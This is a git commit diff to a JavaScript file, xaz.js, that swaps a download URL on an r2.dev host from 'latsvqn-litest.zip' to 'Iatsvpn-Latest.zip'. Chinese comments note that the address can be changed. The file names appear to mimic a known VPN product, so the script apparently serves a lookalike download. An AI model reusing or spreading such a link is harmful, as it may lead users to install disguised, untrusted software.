8069d3bdbfb64f39a5f30fa2377bf0cceaf8f4a3
aa168188 <sli010342@gmail.com>
2025-04-18 22:18:45 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,9 +1,9 @@
  
 
-var xz = "https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/latsvqn-litest.zip";
+var xz = "https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip";
 
-//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/latsvqn-litest.zip  这个改成下载地址；https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/latsvqn-litest.zip
-//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/latsvqn-litest.zip  这个改成文件下载：https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/latsvqn-litest.zip
+//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip  这个改成下载地址；https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip
+//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip  这个改成文件下载：https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip
 
 
 
